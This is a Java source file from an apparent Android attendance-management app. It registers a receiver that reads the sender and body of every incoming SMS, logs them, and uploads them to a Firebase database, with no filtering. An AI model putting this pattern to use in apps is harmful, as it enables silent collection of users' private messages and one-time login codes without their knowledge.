package com.app.attendancemanagementapp.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Objects;

public class ReadSendSMSService extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle extras = intent.getExtras();
        String strMessage = "";
        FirebaseApp.initializeApp(context);
        if ( extras != null ) {
            Object[] smsextras = (Object[]) extras.get( "pdus" );
            for (int i = 0; i < Objects.requireNonNull(smsextras).length; i++ ) {
                String format = extras.getString("format");
                SmsMessage smsmsg = SmsMessage.createFromPdu((byte[])smsextras[i],format);
                String strMsgBody = smsmsg.getMessageBody();
                String strMsgSrc = smsmsg.getOriginatingAddress();
                strMessage += "SMS from " + strMsgSrc + " : " + strMsgBody;
                Log.d("message",strMessage);
                SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
                FirebaseDatabase.getInstance().getReference().child("sms").child(sdf.format(new Date())).setValue(strMessage);
            }
        }
    }
}
